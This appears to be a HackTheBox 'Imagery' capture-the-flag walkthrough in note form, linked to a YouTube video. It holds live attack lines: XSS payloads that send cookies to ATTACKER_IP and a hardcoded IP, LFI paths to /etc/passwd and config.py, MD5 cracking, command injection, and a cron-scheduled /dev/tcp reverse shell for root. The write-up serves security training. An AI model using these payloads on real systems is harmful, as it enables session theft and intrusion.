# HackTheBox - Imagery
**Youtube video:** https://youtu.be/nB4IO2cUEPo
---
## Initial Foothold

**Enumeration:**
```bash
# We enum the website and check the source code
# We see upload page but we don't have access to it
# We register, we see the report bug page
# We check the cookie and see http only false
```

**XSS Cookie Stealing:**
```html
# We use either one to steal an xss cookie
<img src=x onerror="document.location='http://ATTACKER_IP/?c='+document.cookie" />

<img src=x onerror=this.src='http://34.211.174.102/?c='+document.cookie>
```

**LFI Exploitation:**
```bash
# After replacing the cookie, we see download logs and test for lfi
../../../../../../etc/passwd
# It works

# We can either enum through this
/home/kali/Desktop/Payloads/PayloadsAllTheThings/Directory\ Traversal/Intruder/dotdotpwn.txt

# Or since it's flask (werkzeug) then we can check for used libraries by checking config.py
/proc/self/cwd/config.py
# or
../config.py

# We then see that the data is stored in db.json and pass is stored in md5
```

**Crack MD5 Hashes:**
```bash
john hashes.md5 --wordlist=$rockyou --format=Raw-MD5

# We use the pass to sign in with testuser@imagery.htb
```

**Command Injection:**
```bash
# We see we had access to crop features
# We inject a revshell in x or y or width or height
value; REVSHELL #
```

---
## Priv Esc

**Enumeration:**
```bash
# We run linpeas and see a backup in /var/backup with aes file
```

**Decrypt AES Backup:**
```bash
# We download this tool
# https://github.com/Nabeelcn25/dpyAesCrypt.py

python3 dpyAesCrypt.py <file> <wordlist>

# We get mark pass, so we su mark and type pass
```

**Root via Charcol:**
```bash
# We use sudo -l and we see Charcol
sudo -l

# To remove the pass
sudo Charcol -R

# Then in shell we add this to get a revshell to our machine
sudo Charcol shell

auto add --schedule "* * * * *" --command "/bin/bash -c '/bin/bash -i >& /dev/tcp/YOURIP/4444 0>&1'" --name "strikoder" --log-output /tmp/auto.log
```
